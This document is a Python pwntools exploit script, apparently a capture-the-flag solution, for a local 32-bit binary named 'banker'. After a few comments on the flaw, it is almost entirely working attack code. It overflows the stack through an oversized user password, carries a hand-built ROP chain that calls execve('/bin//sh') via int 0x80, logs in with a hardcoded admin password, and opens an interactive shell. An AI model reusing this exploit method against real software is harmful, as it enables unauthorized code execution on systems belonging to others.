#!/usr/bin/env python2
from pwn import *
import string
# This is a simple stack overflow that is a little difficult to get to
# We need to create a user whose password is 66 characters or greater, then we can log out and then back in to get EIP
# the password should technically be only alphanumeric, but there is a bug and it accepts all passwords
# But there is a password prompt in the way, which we need to bruteforce
# note that /tmp/users.txt needs to exsist.
# file format:
# username b64password 1
# last bit is if admin or not

# generate rop chain ahead of time
'''import angr, angrop
p = angr.Project("./banker")
rop = p.analyses.ROP()
rop.find_gadgets()
chain = rop.execve()
rp = chain.payload_str()
print(enhex(rp))'''
#rp = unhex("557c05082e62696ed3ef0608c02f100868790e08557c05082e736800d3ef0608c42f100868790e08c5b10708000000000000000082a30f08c5b107080000000000000000557c05080b00000005d40608c02f100840400808")
from struct import pack

# from ROPgadget, angrop did not work
# Padding goes here
p = ''

p += pack('<I', 0x0808362a) # pop edx ; ret
p += pack('<I', 0x080fc060) # @ .data
p += pack('<I', 0x08057c56) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x080b4afd) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808362a) # pop edx ; ret
p += pack('<I', 0x080fc064) # @ .data + 4
p += pack('<I', 0x08057c56) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x080b4afd) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808362a) # pop edx ; ret
p += pack('<I', 0x080fc068) # @ .data + 8
p += pack('<I', 0x0804d120) # xor eax, eax ; ret
p += pack('<I', 0x080b4afd) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080fc060) # @ .data
p += pack('<I', 0x08083651) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080fc068) # @ .data + 8
p += pack('<I', 0x080fc060) # padding without overwrite ebx
p += pack('<I', 0x0808362a) # pop edx ; ret
p += pack('<I', 0x080fc068) # @ .data + 8
p += pack('<I', 0x0804d120) # xor eax, eax ; ret
p += pack('<I', 0x080904df) # inc eax ; ret
p += pack('<I', 0x080904df) # inc eax ; ret
p += pack('<I', 0x080904df) # inc eax ; ret
p += pack('<I', 0x080904df) # inc eax ; ret
p += pack('<I', 0x080904df) # inc eax ; ret
p += pack('<I', 0x080904df) # inc eax ; ret
p += pack('<I', 0x080904df) # inc eax ; ret
p += pack('<I', 0x080904df) # inc eax ; ret
p += pack('<I', 0x080904df) # inc eax ; ret
p += pack('<I', 0x080904df) # inc eax ; ret
p += pack('<I', 0x080904df) # inc eax ; ret
p += pack('<I', 0x080566a3) # int 0x80
# guess password length = 8
password = ''
al = string.digits + string.ascii_lowercase + string.ascii_uppercase
#context.log_level = 'DEBUG'
r = process("./banker")
# do a binary search for each character
# or we can just cheat since we know the password locally :)
r.recvuntil("username: ")
r.sendline("admin")
r.recvuntil("password: ")
r.sendline("rOe1mevX")

r.sendline("6")
r.sendline("1")
r.recvuntil("Username: ")
r.sendline("tmb")
r.recvuntil("Password: ")
r.sendline('a' * 66 + p)
r.sendline("4")
r.sendline("5")
r.clean()
r.interactive()
